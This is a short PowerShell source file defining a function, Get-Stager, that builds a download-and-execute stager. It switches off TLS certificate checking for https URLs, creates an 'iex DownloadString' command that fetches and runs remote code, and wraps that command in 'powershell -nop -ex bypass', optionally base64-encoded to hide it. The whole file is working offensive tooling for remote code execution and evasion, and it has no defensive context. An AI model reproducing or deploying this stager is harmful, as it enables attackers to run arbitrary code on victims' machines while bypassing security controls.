function Get-Stager ([string]$URL,[switch]$Base64) {
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 1.0.0
    
    # Bypass Self-Signed Certificate Restriction
    if ($URL -like "https*") {
    $Bypass = @"
`$CertBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
Add-Type `$CertBypass;
[SelfSignedCerts]::Bypass();`n
"@;
    }
    else { $Bypass = $NULL }


    # Final Payload
    $Stager = $Bypass + "iex ([System.Net.WebClient]::new().DownloadString('$URL'))"


    # PowerShell -NoProfile -ExecutionPolicy Bypass -Command/EncodedCommand {Stager}
    if ($Base64) { $Payload = "powershell -nop -ex bypass -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
    else         { $Payload = "powershell -nop -ex bypass -c {$Stager}" }

    return $Payload
}